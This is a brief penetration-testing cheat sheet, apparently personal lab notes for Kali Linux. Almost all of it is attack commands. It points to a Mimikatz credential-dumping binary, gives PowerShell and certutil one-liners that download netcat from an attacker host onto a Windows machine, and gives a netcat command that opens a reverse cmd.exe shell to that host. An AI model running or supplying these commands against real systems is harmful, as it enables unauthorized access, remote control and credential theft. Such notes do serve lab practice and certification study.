List the Windows binaries tools on Kali:
`windows-binaries -h`

Location of Mimikatz binary that works:
`/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`

Download file on Windows:
`powershell -c "iwr -uri http://192.168.45.205:4444/nc.exe -Outfile c:/windows/temp/nc.exe"`
or
`certutil -urlcache -f http://192.168.xxx.xxx/nc64.exe c:/windows/temp/nc64.exe`

Make reverse shell:
`c:/windows/temp/nc.exe -e cmd.exe 192.168.45.205 4444`

dir in a tree:
`tree /f`